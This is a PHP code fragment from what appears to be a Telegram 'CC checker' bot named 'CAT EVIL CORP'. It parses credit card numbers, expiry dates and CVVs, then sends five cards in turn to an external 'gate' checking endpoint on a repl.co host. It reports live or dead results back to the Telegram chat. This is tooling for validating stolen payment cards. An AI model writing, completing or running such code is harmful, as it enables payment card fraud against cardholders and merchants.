...
$cvvz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[3];
  ...
  $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>CAT EVIL CORP ✅- Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] STATUS: MASS CHECK INITIATED. WAIT...%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
  
    $sent = json_decode(file_get_contents($sendmes) ,1);
      $mes_id = $sent['result']['message_id'];
  
  $r1 = file_get_contents('https://Cat-Evil-CHK-SK.catevil.repl.co/skbasedchk/gate/usd0.5.php?lista='.$lista1.'');
  ...
  editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A$ccr1</b>",$mes_id);
    $r2 = file_get_contents('https://Cat-Evil-CHK-SK.catevil.repl.co/skbasedchk/gate/usd0.5.php?lista='.$lista2.'');
  $msg2 = trim(strip_tags(getStr($r2,' <br>Result:','</span><br>')));
  $ccr2 = "[ϟ] 2nd CC: <code>$lista2</code>%0A[ϟ] 2nd CC RESULT: $msg2%0A━━━━━━━━━━━━━";
  editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A$ccr1%0A$ccr2</b>",$mes_id);
  $r3 = file_get_contents('https://Cat-Evil-CHK-SK.catevil.repl.co/skbasedchk/gate/usd0.5.php?lista='.$lista3.'');
  $msg3 = trim(strip_tags(getStr($r3,' <br>Result:','</span><br>')));
  $ccr3 = "[ϟ] 3rd CC: <code>$lista3</code>%0A[ϟ] 3rd CC RESULT: $msg3%0A━━━━━━━━━━━━━";
  editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3</b>",$mes_id);
    $r4 = file_get_contents('https://Cat-Evil-CHK-SK.catevil.repl.co/skbasedchk/gate/usd0.5.php?lista='.$lista4.'');
  $msg4 = trim(strip_tags(getStr($r4,' <br>Result:','</span><br>')));
  $ccr4 = "[ϟ] 4th CC: <code>$lista4</code>%0A[ϟ] 4th CC RESULT: $msg4%0A━━━━━━━━━━━━━";
  editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4</b>",$mes_id);
  $r5 = file_get_contents('https://Cat-Evil-CHK-SK.catevil.repl.co/skbasedchk/gate/usd0.5.php?lista='.$lista5.'');
  $msg5 = trim(strip_tags(getStr($r5,' <br>Result:','</span><br>')));
  $ccr5 = "[ϟ] 5th CC: <code>$lista5</code>%0A[ϟ] 5th CC RESULT: $msg5";
  editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5</b>",$mes_id);
    $time_end = microtime(true);
  $execution_time = ($time_end - $time_start);
   editMessage($chatId, "<b>CAT EVIL CORP ✅- Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5%0A━━━━━━━━━━━━━%0A[ϟ] 5 CARDS CHECKED!✅%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
}
}
}